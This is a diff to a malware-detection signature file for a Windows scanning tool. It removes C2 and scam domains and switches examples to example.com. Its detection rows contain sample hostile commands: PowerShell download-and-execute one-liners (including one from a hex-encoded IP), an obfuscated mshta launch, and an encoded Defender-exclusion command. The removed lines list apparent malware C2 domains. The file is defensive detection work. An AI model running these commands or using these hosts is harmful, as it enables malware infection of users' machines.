@@ -5,6 +5,8 @@
 # match: =text (the whole value), *text (part of it), /regex/ key=text (key: a lowercase literal every match contains).
 #        Case-insensitive; (?-i:...) where case matters. A regex without a key runs on every value: only for task, run, service, software.
 # Every row must match its own example (tests). Only patterns of recurring families; no one-off random names.
+# No malicious domains in this file, in any column (match or example): it is embedded in Spor.exe, and malware domains in the
+# binary make antivirus engines flag Spor (VirusTotal). Domain rows only in Spor.autodetect.txt next to Spor.exe; examples use example.com.
 
 
 # RenLoader (RenPy / Node.js loaders from fake game and software download sites)
@@ -43,31 +45,7 @@ path	*\appdata\local\datasync dynamics\	PavinLoader	install folder	C:\Users\anna
 # CountLoader
 task	/^\\[A-Za-z0-9_]+\{[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{15}\}$/	CountLoader	task name + {4-4-4-4-15 hex}	\ServiceTask{10EA-DA7D-FDF7-D0D9-AB4121FAF148998}	10427,10428,11816,11817,11818,11819,15198,18957,19042,19043,19045,19046,19047,19049,19050,19052,19053,19055,19056,19058,19059,19061,19062,19064,19065,19067,19068,19070,19072,19073,19075,19077,19078,19080,19083,19084,19085,19086,19088,19089,19090,19091,19092,19093,19094,19095,19096,19097,19098,19099,19100,19101,19102,19103,19104,19105,19106,19107,19108,19109,19110,19111,19112,19113,19114,19115,19139
 path	/\\Users\\[^\\]+\\(Run|App)_\{[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{15}\}\.py$/ key=}.py	CountLoader	Python stage	C:\Users\anna\App_{17C2-F3BE-B65E-EF8C-40EABC1CC9F24D5}.py	19044,19048,19051,19054,19057,19060,19063,19066,19069,19071,19074,19076,19079,19081,19082,19140
-cmd	*\*i*\*2\msh*e	CountLoader	obfuscated mshta path in PowerShell	powershell -c "Start-Process \*i*\*2\msh*e https://example.vg"	13221
-domain	/(^|\.)s\d+-microservice-updatehub\.cc$/ key=microservice-updatehub.cc	CountLoader	C2 domain	s3-microservice-updatehub.cc	18957
-cmd	*microservice-updatehub.cc	CountLoader	C2 domain	powershell.exe -ep Bypass -Command "$u='https://s{i}-microservice-updatehub.cc';iex (irm $u)"	18957
-domain	=ccleaner.gl	CountLoader	C2 domain	x.ccleaner.gl	19012
-domain	=command-center.cc	CountLoader	C2 domain	x.command-center.cc	19030
-domain	=deluxe.gl	CountLoader	C2 domain	x.deluxe.gl	19014
-domain	=explorer.vg	CountLoader	C2 domain	x.explorer.vg	19016
-domain	=fileless-market.cc	CountLoader	C2 domain	x.fileless-market.cc	19011
-domain	=files-storage.cc	CountLoader	C2 domain	x.files-storage.cc	19017
-domain	=fileshare.vg	CountLoader	C2 domain	x.fileshare.vg	19015
-domain	=firefox.vg	CountLoader	C2 domain	x.firefox.vg	19018
-domain	=flowtracker.vg	CountLoader	C2 domain	x.flowtracker.vg	19031
-domain	=hosting-control.cc	CountLoader	C2 domain	x.hosting-control.cc	19022
-domain	=hosting-explorer.cc	CountLoader	C2 domain	x.hosting-explorer.cc	19021
-domain	=immortal-service.cc	CountLoader	C2 domain	x.immortal-service.cc	19023
-domain	=indeanapolice.cc	CountLoader	C2 domain	x.indeanapolice.cc	19025
-domain	=memory-scanner.cc	CountLoader	C2 domain	x.memory-scanner.cc	19027
-domain	=moderxdrsolution.vg	CountLoader	C2 domain	x.moderxdrsolution.vg	19019
-domain	=msgrouppolicy.vg	CountLoader	C2 domain	x.msgrouppolicy.vg	19020
-domain	=network-defender.cc	CountLoader	C2 domain	x.network-defender.cc	19013
-domain	=offshore-storage.cc	CountLoader	C2 domain	x.offshore-storage.cc	19028
-domain	=parent-control.cc	CountLoader	C2 domain	x.parent-control.cc	19010
-domain	=snconor.vg	CountLoader	C2 domain	x.snconor.vg	19024
-domain	=venom-flagman.cc	CountLoader	C2 domain	x.venom-flagman.cc	19026
-domain	=vless-proto.cc	CountLoader	C2 domain	x.vless-proto.cc	19029
+cmd	*\*i*\*2\msh*e	CountLoader	obfuscated mshta path in PowerShell	powershell -c "Start-Process \*i*\*2\msh*e https://example.com"	13221
 
 # ChromeLoader
 path	/\\AppData\\Local\\chrome_(display|test|performance)(\\|$)/ key=\chrome_	ChromeLoader	install folder	C:\Users\anna\AppData\Local\chrome_display\x.ps1	27638
@@ -101,7 +79,7 @@ cmd	*-w hidden -nop -ep bypass -c "&([scriptblock]::create	PowerShell loader	hid
 cmd	/\b(iex|irm)\b.*\b0x[0-9a-f]{1,2}\.0x[0-9a-f]{1,2}\./ key=.0x	PowerShell loader	download from an IP written in hex	powershell -NoP -Exec Bypass -W Hidden -Command "Iex(Irm 0xc0.0x6d.0xc8.0x3f/regevent)"	5786
 cmd	/powershell.*\[reflection\.assembly\]::load/ key=[reflection.assembly]::load	PowerShell loader	.NET reflection loader	powershell.exe -w h -c [Reflection.Assembly]::Load($b)	18791
 cmd	/powershell.*(?-i:JAB)[A-Za-z0-9+/]{16,}/ key=jab	PowerShell loader	base64 PowerShell script	POWersHell.EXe -nopROfi -WinDOWSTYl HiD -EN JABmAGEAMAA5ADEAYgA9AFsAbQBhAHQAaAA	10469,10470
-cmd	/mshta(\.exe)?"?\s+"?https?:\/\// key=mshta	mshta loader	mshta runs a web page (ClickFix, CountLoader)	C:\WINDOWS\system32\mshta.exe https://msgrouppolicy.vg	6215
+cmd	/mshta(\.exe)?"?\s+"?https?:\/\// key=mshta	mshta loader	mshta runs a web page (ClickFix, CountLoader)	C:\WINDOWS\system32\mshta.exe https://example.com/x	6215
 cmd	*qqbkagqalqbnahaauabyaguazgblahiazqbuagmazqag	PowerShell loader	base64 Add-MpPreference (Defender exclusion)	powershell -enc QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMA	83,11782,11783
 task	/\{(\d{6,10})-\1\}$/	PowerShell loader	task name + {N-N} (AES PowerShell loader)	\MicrosoftEdgeUpdateTaskMachineCoreb{1795992834-1795992834}	15212,15213,15232,15233
 run	=Windows PowerShell v1.0	PowerShell loader	Run entry named like PowerShell	Windows PowerShell v1.0	14,5785,6565
@@ -120,8 +98,6 @@ path	*\windows\copilot\manager\aimanager\	Coinminer	nssm service in a fake Copil
 path	*\system32\wsvcz\	Coinminer	XMRig in a fake System32 folder	C:\Windows\System32\wsvcz\u718079.exe	14894,15268,28337
 path	/\\System32\\u\d{6}\.(dll|exe)$/ key=\system32\u	Coinminer	u+6 digits DLL service	C:\Windows\System32\u135682.dll	14884,14885,15266,15267,15313,28334,28335,28336
 service	/^u\d{6}$/	Coinminer	service u+6 digits	u135682	14885,15266
-company	*xmrig.com	Coinminer	XMRig	unsigned; ; company www.xmrig.com	14894,28337
-domain	=xmrig.com	Coinminer	XMRig site	xmrig.com	14883
 
 # Proxyware
 path	*\diagnosticsnet\	Proxyware	proxyware / browser injector folder (DiagnosticsNET)	C:\ProgramData\DiagnosticsNET\x.exe	82,19117,19119
@@ -203,15 +179,3 @@ service	*$77	r77 rootkit	r77 hides names that start with $77	$77svc64	13715,1371
 path	*\$77	r77 rootkit	r77 hides names that start with $77	C:\Windows\$77fix.exe	13715,13716,13717
 cmd	*$77	r77 rootkit	r77 hides names that start with $77	cmd /c start $77svc	13715,13716,13717
 
-# Browser notification and search hijack domains
-domain	=mymandardair.com	Notification scam	malicious notification / search domain	x.mymandardair.com	19131
-domain	=vendralo.info	Notification scam	malicious notification / search domain	x.vendralo.info	10778
-domain	=davisonbarker.pro	Notification scam	malicious notification / search domain	x.davisonbarker.pro	20146
-domain	=fisicule.co.in	Notification scam	malicious notification / search domain	x.fisicule.co.in	26742
-domain	=trovixnero.co.in	Notification scam	malicious notification / search domain	x.trovixnero.co.in	21132
-domain	=asw-confm.co.in	Notification scam	malicious notification / search domain	x.asw-confm.co.in	14629
-domain	=tyvexbotshield.co.in	Notification scam	malicious notification / search domain	x.tyvexbotshield.co.in	14624
-domain	=nertyu.co.in	Notification scam	malicious notification / search domain	x.nertyu.co.in	28038
-domain	=coreprotects.co.in	Notification scam	malicious notification / search domain	x.coreprotects.co.in	28039
-domain	=hohosearch.com	Notification scam	malicious notification / search domain	x.hohosearch.com	23236
-domain	*re-captha-version-	Notification scam	fake captcha notification domain	re-captha-version-3-19.top	14616
